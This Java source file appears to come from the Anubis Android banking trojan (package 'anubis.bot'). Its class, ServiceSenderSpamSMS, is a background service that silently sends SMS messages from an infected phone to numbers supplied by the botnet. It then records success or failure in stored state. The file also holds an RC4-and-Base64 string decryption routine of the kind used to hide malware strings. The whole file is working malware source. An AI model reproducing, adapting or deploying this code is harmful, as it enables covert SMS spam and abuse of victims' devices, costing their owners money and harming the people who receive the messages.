package anubis.bot.myapplication.API.Spam;

import android.app.Activity;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Base64;
import android.util.Log;

import java.util.ArrayList;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class ServiceSenderSpamSMS extends Service {
    Context context;
    UtilsClass utilsClass = new UtilsClass();
    public ServiceSenderSpamSMS() {
    }
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    @Override
    public void onCreate() {
        super.onCreate();
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        context = this;
        String number = intent.getStringExtra("number");
        String msg = intent.getStringExtra("msg");

        utilsClass.sendSMS(this, number,msg);

        registerReceiver(sentReceiver , new IntentFilter("SMS_SENT"));

        return START_NOT_STICKY;
    }


    BroadcastReceiver sentReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

                switch (getResultCode()) {
                    case Activity.RESULT_OK:
                        utilsClass.Log("S", "SMS SENT");
                        utilsClass.SetWrite(context, "indexSMSSPAM","");
                        unregisterReceiver(sentReceiver);
                        stopSelf();
                        break;
                    default:
                        utilsClass.Log("S", "Error SMS SENT");
                        utilsClass.SetWrite(context, "indexSMSSPAM",utilsClass.SetRead(context,"indexSMSSPAM")+"|");
                        unregisterReceiver(sentReceiver);
                        stopSelf();
                        break;
                }
        }
    };
}
